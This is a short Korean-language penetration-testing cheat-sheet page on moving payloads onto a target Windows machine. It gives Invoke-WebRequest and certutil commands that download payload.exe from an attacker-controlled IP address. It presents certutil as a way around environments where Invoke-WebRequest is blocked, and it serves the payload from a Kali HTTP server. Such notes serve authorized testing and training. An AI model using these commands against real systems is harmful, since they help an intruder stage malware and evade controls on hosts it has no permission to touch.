# PowerShell 파일 전송

대상 Windows에서 페이로드 다운로드. 해시 확인은 [파일 조작](./powershell_file_operations.md)을 본다.

> 관련 문서: [PowerShell 치트시트](./README.md) · [Invoke-WebRequest 예시](./invoke_webrequest.md)

## Invoke-WebRequest

```powershell
Invoke-WebRequest -Uri http://192.168.45.227/payload.exe -OutFile C:\temp\payload.exe

# 별칭
IWR http://192.168.45.227/payload.exe -OutFile .\payload.exe
```

## certutil (IWR 차단 환경 우회)

```powershell
certutil -urlcache -split -f http://192.168.45.227/payload.exe C:\temp\payload.exe
```

리스너는 Kali에서 `python3 -m http.server 80`으로 띄운다.
